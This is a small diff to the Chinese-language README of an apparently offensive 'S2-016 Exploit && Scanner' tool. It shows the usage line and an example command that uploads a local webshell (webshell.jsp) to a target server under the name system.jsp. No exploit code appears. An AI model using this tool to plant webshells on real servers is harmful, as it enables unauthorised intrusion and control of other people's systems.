@@ -5,6 +5,7 @@ S2-016 Exploit &amp;&amp; Scanner
 使用方法：
 python s2-016.py [target_url] [filename of a  webshell] [shellname at remote host]
 例子:
+
 [+]目标:www.xxoo.com 当前路径下有名为webshell.jsp的木马  
 [+]命令行执行:python s2-016.py http://www.xxoo.com webshell.jsp system.jsp
 目标是www.xxoo.com，要传上去的webshell名字是webshell.jsp（放在当前路径下），system.jsp是传到远程服务器上时，在服务器端的名字
